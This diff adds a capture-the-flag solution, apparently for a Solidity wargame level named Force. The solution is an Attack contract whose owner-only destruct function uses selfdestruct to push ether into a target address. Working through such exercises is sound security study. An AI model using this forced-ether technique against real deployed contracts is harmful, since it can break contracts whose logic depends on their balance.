@@ -10,3 +10,24 @@ contract Force {/*
  (______)__m_m)
 
 */}
+
+
+// solution
+contract Attack {
+  uint256 balances;
+  address owner;
+
+  constructor() payable {
+    balances = msg.value;
+    owner = msg.sender;
+  }
+
+  modifier onlyOwner(){
+    require(msg.sender == owner, "Only owner can destroy contract");
+    _;
+  }
+  function destruct(address _address) public onlyOwner payable{
+    selfdestruct(payable(_address));
+  }
+  
+}
